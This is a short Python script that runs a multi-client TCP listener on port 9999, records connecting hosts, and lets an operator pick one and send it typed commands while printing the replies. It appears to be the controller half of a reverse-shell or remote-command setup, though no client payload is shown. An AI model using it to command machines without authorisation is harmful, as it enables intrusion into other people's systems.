# multi server
import socket
import time
import sys
import struct
import threading

NUM_THREADS = 2
JOBS = [1, 2]


class MultiServer(object):

    def __init__(self):
        self.host = ''
        self.port = 9999
        self.socket = None
        self.all_connections = []
        self.all_addresses = []

    def create_server(self):
        try:
            self.socket = socket.socket()
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            return True
        except socket.error as e:
            print("Socket binding error: " + str(e))
            time.sleep(5)
            self.create_server()

    def start_server(self):
        for c in self.all_connections:
            c.close()

        self.all_connections = []
        self.all_addresses = []

        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)  # blocking
                client_hostname = conn.recv(1024).decode('utf-8')
                address = address + (client_hostname,)
            except Exception as e:
                print('Error accepting connections: ' + str(e))
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(address)
        return

    def handle_client(self):
        pass


def start_server(server):
    server.create_server()
    server.start_server()


def process_client(server):
    print('Waiting for clients.')
    while True:
        if not server.all_addresses:
            print(".",end="")
            time.sleep(1)
            sys.stdout.flush()
            continue
        for  i, item in enumerate(server.all_addresses):
                print(i, item)
        cmd = input('Select your client : ')
        if cmd == 'r':
            continue
        client = server.all_connections[int(cmd)]
        send_commands(client)


def send_commands(client):
    cmd = "join"
    while 1:
        client.send(cmd.encode())
        if(cmd == 'quit'):
            break
        client_response = str(client.recv(1024), "utf-8")
        print(client_response, end="")
        cmd = input()
     
           
def start():
    server = MultiServer()
    listener_thread = threading.Thread(target=start_server, args=(server,))
    listener_thread.daemon = True
    listener_thread.start()

    worker_thread = threading.Thread(target=process_client, args=(server,))
    worker_thread.daemon = True
    worker_thread.start()
    listener_thread.join()
    worker_thread.join()


def main():
    start()


main()
